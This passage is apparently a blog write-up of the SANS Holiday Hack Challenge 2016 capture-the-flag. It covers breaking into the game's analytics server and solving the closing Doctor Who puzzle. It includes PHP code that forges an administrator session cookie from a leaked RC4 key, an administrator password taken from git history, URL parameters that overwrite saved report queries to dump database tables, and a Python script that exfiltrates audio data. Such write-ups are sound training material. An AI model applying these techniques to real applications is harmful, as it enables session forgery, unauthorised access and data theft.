After reviewing some of the basic pages like `index.php`, `login.php`, `header.php`, and `footer.php`, I began to focus on the crypto.php file. This file showed me the mechanism to create the `AUTH` session cookie. I exposed the crypto key and algorithm they used to create the key.

```php
<?php
define('KEY', "\x61\x17\xa4\x95\xbf\x3d\xd7\xcd\x2e\x0d\x8b\xcb\x9f\x79\xe1\xdc");

function encrypt($data) {
    return mcrypt_encrypt(MCRYPT_ARCFOUR, KEY, $data, 'stream');   
}
    
function decrypt($data) {
    return mcrypt_decrypt(MCRYPT_ARCFOUR, KEY, $data, 'stream');   
} 
    
?>
```

Also in `login.php`, I saw this code was used

```php
<?php
$auth = encrypt(json_encode([
      'username' => $_POST['username'],
      'date' => date(DateTime::ISO8601),
    ]));

    setcookie('AUTH', bin2hex($auth));
?>
```

I used this same method to forge a session cookie for the `administrator` account with the following snippet.

```php
<?php
   define('KEY', "\x61\x17\xa4\x95\xbf\x3d\xd7\xcd\x2e\x0d\x8b\xcb\x9f\x79\xe1\xdc");   
   
   function encrypt($data) {     return mcrypt_encrypt(MCRYPT_ARCFOUR, KEY, $data, 'stream');   }   
   
   function decrypt($data) {     return mcrypt_decrypt(MCRYPT_ARCFOUR, KEY, $data, 'stream');   }   
   
   $creds = array('username'=>'administrator',
                  'data' => date(DateTime::ISO8601) );

  $auth = encrypt(json_encode($creds));
  echo bin2hex($auth);
?>
```

I was able to use the provided cookie in a cookie add-on in the browser to get authenticated as the `administrator`.

Additionally, I was able to create a patch of all changes in each file for the website. The command to do this for the `sprusage.sql` file is below:

```shell
git log -p sprusage.sql
```

It reveals that during a few different commits the following line was added and then removed from the list of `sql` commands.

```sql
INSERT INTO `users` VALUES (0,'administrator','KeepWatchingTheSkies'),(1,'guest','busyllama67');
```

I am able to confirm that is still the administrator's password. So now not only can I forge a cookie to be the admin, I can login as the user.

As the admin, you are not presented with the `MP3` link in the menu bar at the the top of the site. It is replaced with an `Edit` link. This page provides functionality to edit reports that have previously been run on the system. The website provides a capability to query the `launch` and `usage` statistics of the *SantaGram* app. Queries can be saved and are given a report number. The guest user can query the usage and launch tables in the database, can save the queries as reports, and then view the reports at a later time. Only the admin can edit the reports.

![Analytics Admin View](../assets/images/holidayhack2016/analytics_adminview.png)

Looking at the code for `query.php`, I do not see anyway to inject anything into the database as it uses `mysqli_real_escape_string()` on all user provided values to build the query. The same approach is used in `edit.php`. I did notice that when a query is saved as a report, its not the results that are saved, but the query itself. Then when a user visits the `view.php` page that query is re-executed and the results displayed.

Since the only new addition as admin is the `edit.php` file, we will try to exploit it. The page allows a user to enter an existing report id and provide a new name and description. The page then queries the database for that report and build an `UPDATE` query to change to the new field that are provided. The code snippet is below:

```php
<?php
$result = mysqli_query($db, "SELECT * FROM `reports` WHERE `id`='" . mysqli_real_escape_string($db, $_GET['id']) . "' LIMIT 0, 1");
    if(!$result) {
      reply(500, "MySQL Error: " . mysqli_error($db));
      die();
    }
    $row = mysqli_fetch_assoc($result);

    # Update the row with the new values
    $set = [];
    foreach($row as $name => $value) {
      print "Checking for " . htmlentities($name) . "...<br>";
      if(isset($_GET[$name])) {
        print 'Yup!<br>';
        $set[] = "`$name`='" . mysqli_real_escape_string($db, $_GET[$name]) . "'";
      }
    }

    $query = "UPDATE `reports` " .
      "SET " . join($set, ', ') . ' ' .
      "WHERE `id`='" . mysqli_real_escape_string($db, $_REQUEST['id']) . "'";
    print htmlentities($query);

    $result = mysqli_query($db, $query);
?>
```

The vulnerability that you exploit is that for every column in the results of the query if you pass it as a `GET` parameter, it will be updated. The page form only provides us with the `name` and `detail` fields to update, but we know that table has more columns. From `sprusage.sql`:

```sql
CREATE TABLE `reports` (
  `id` varchar(36) NOT NULL,
  `name` varchar(64) NOT NULL,
  `description` text,
  `query` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
```
 
So if we pass a new query string as the `query` parameter to `edit.php`, we can overwrite query. So lets dump the `users` table with the following URL parameters:

```
edit.php?\
   id=031412db-0f8e-495b-b1b3-e5ede942566b&\
   name=a&\
   description=a&\
   query=SELECT%20*%20from%20users
```

Now using that report id in the `view.php` page, we see the following

![Analytics User Database](../assets/images/holidayhack2016/analytics_dump_users.png)

So there's the administrators password again. The goal is to get the audio file and we know there is a table called `audio` that has all the metadata about the audio files, so lets query it (I set the name and query parameters the same to be able to know the payload)

```
edit.php?\
   id=031412db-0f8e-495b-b1b3-e5ede942566b&\
   name=SELECT%20*%20from%20audio&\
   query=SELECT%20*%20from%20audio
```

![Analytics Audio Database](../assets/images/holidayhack2016/analytics_audio_dump.png)

Now we have the audio file name and id for the seventh and file audio clip. We now must pull it down from the server. A few files in the source related to the audio files must be reviewed, `mp3.php` and `getaudio.php`. 

The file `mp3.php` defines a function to build the URL to the `getaudio.php` for the current user and its allowed audio files.

```php
<?php
  require_once('crypto.php');
  require_once('db.php');

  function mp3_web_path($db) {
    $result = query($db, "SELECT `id` FROM `audio` WHERE `username` = '" . mysqli_real_escape_string($db, get_username()) . "'");

    if (!$result) {
      return null;
    }

    return 'getaudio.php?id=' . $result[0]['id'];
  }
?>
```

This is the generatored URL from `index.html` when the guest user logs into the website. Now that we know the id for the seventh audio file, we can try to build that URL for ourselves. But we are denied access. Looking at the code for `getaudio.php`, we see that only the guest account can download the audio with this page.

```php
<?php
  $username = get_username();

  // EXPERIMENTAL! Only allow guest to download.
  if ($username === 'guest') {

    $result = query($db, "SELECT * FROM `audio` WHERE `id` = '" . mysqli_real_escape_string($db, $_GET['id']) . "' and `username` = '" . mysqli_real_escape_string($db, $username) . "'");

    if ($result) {
      header('Content-Description: File Transfer');
      header('Content-Type: application/octet-stream');
      header('Content-Disposition: attachment; filename=' . $result[0]['filename']); 
      header('Content-Transfer-Encoding: binary');
      header('Connection: Keep-Alive');
      header('Expires: 0');
      header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
      header('Pragma: public');
      header('Content-Length: ' . strlen($result[0]['mp3']));

      ob_clean();
      flush();
      print $result[0]['mp3'];

      return;
    }

  }

  require_once('header.php');

  ?>
  <div class="alert alert-warning"><strong>Not Accessible!</strong> File does not exist or you do not have access to the file.</div>
?> 
```

This shows the actual data for the audio file is saved in the database in the `audio` table in the `mp3` column. So we can return to edit page and get it to dump the `mp3` column so that is encoded so we can download it. I scripted up a python program to login into the website, edit a known report, and download the audio file.

```python
import requests
from bs4 import BeautifulSoup

url = "https://analytics.northpolewonderland.com/"

admindata = {"username":"administrator","password":"KeepWatchingTheSkies"}

s = requests.Session()
ra = s.post(url+'login.php',data=admindata)
cookies = s.cookies

report = "9b0d08d6-cd77-47ed-8b2d-f81863cc525b"

pwn = "select filename, hex(mp3) from audio where username='administrator'"
result = s.get(url+'edit.php',cookies=cookies, params={'id':report, 'name':pwn, 'query':pwn})
view = s.get(url+'view.php', cookies=cookies, params={"id":report})

soup = BeautifulSoup(view.text)
filename, mp3 = [e.text for e in soup.find_all('td')]

with open(filename,'wb') as output:
    output.write(mp3.decode('hex'))

print "Audio file saved as {} with size {} kilobytes".format(filename,
        len(mp3)/2000)
```

The output is below:

```
Audio file saved as discombobulatedaudio7.mp3 with size 220 kilobytes
```

So the name of the final audio file is: `discombobulatedaudio7.mp3`


#### So the answers to the questions for part four...

The name of the files from each server are shown in the table below

* A7: The names of the files from each server as follows:

|Server|    File Name| Download |
|-------|:------------:|:------:|
|APK File    |discombobulatedaudio1.mp3|[link](../assets/mp3/discombobulatedaudio1.mp3)|
|Analytics Pre    |discombobulatedaudio2.mp3|[link](../assets/mp3/discombobulatedaudio2.mp3)|
|Dungeon    |discombobulatedaudio3.mp3|[link](../assets/mp3/discombobulatedaudio3.mp3)|
|Debug    |debug-20161224235959-0.mp3|[link](../assets/mp3/discombobulatedaudio4.mp3)|
|Banner    |discombobulatedaudio5.mp3|[link](../assets/mp3/discombobulatedaudio5.mp3)|
|Exception    |discombobulated-audio-6-XyzE3N9YqKNH.mp3|[link](../assets/mp3/discombobulatedaudio6.mp3)|
|Analytics Post    |discombobulatedaudio7.mp3|[link](../assets/mp3/discombobulatedaudio7.mp3)|

#### Part 5: Discombobulated Audio

Before having collected up the last file, I had 6 of the 7 audio files. I decided to try and solve the mystery of who kidnapped Santa. (once I got the 7th file, I had the entire audio clip) Each audio file sounds like a some crazy tunes with a very slow vocal track. I took each audio file and put combined them sequentially in the order of the file name (assuming Debug is #4 since it was listed as the third targeted server). Once I combined them, I opened them in the free audio tool Audacity.  After messing around with various speed settings, I end up changing the **tempo** of the track, which changes the speed but not the pitch. The audio initially to me (without the 7th file) to sounded like 

>> Merry Christmas, Santa Claus or as I have know him....

![Audacity Combine](../assets/images/holidayhack2016/audacity.png)

[Download the combined and modified audio file](../assets/mp3/cleaned_audio.wav)

I was pretty sure I heard a British accent and then remembered the miniature British police call box on Santa's desk. Knowing this is the iconic TARDIS that allows Doctor Who to conduct time travel, I was pretty sure this was a quote from Doctor Who. I also know that Doctor Who always has a Christmas episode, I figured this was a pretty good guess on the culprit. After spending some time Googling my assumed phrase, I went back to the audio file to listen again. Here I realized that it was not `Merry Christmas` but `Father Christmas`. With this improved quote and Doctor Who, my Google search brought me to the 2005 Christmas episode of **Doctor Who** entitled *A Christmas Carol* and this quote.

![IMDB Quote](../assets/images/holidayhack2016/imdb_doctor_who.png)

I knew that somehow this information had to be used in the game to figure out the culprit and his motivation. But I had not seen any parts of the game that I could not access. I knew a special area still had to exist. I then recalled that I never used the passphrase from the *WarGames* terminal in Santa's office. Also realizing that [Ed Skoudis's office](http://thesteampunkhome.blogspot.com/2011/02/eds-office-tour.html) seems vary similar to Santa's office, I figure there is a new secret door somewhere. I return to Ed's errrr Santa's office and attempt to walk through the walls until I hit the left bookcase. I hit the password panel. I enter `LOOK AT THE PRETTY LIGHTS` and I enter a new room called the `Corridor`. Lots of players are hanging out here.

Entering the entire quote from Doctor Who, I was able to enter the door at the top of the corridor. This brought me to a staircase to climb the tower. I ascended to the top to find the Doctor standing there.

![Coordior Hangout](../assets/images/holidayhack2016/dr_who_combine.png)

In the conversation with the Doctor he admits to kidnapping Santa Claus. He admits that he wants to take Santa with him (or Jeff) back to November 17, 1978 to stop the [Star Wars Holiday Special](http://www.starwarsholidayspecial.com) from ever airing. Unfortunately we foiled the plot so the special will continue to be part of our universe (but I mean, [Boba Fett](https://www.youtube.com/watch?v=UC2Q6ANLXQ0) did make his debut in that special, so it cannot be that bad.)

#### The answers to the question for part five are...

* A9: The villain behind the nefarious plot is Dr. Who
* A10: Dr. Who kidnapped Santa to take him back to 1978 so to make it so that the Star Wars Holiday Special never existed.
That was so much fun and a great challenge. Thanks to Ed and the team and looking forward to 2017!

#### Constant Vigilance!
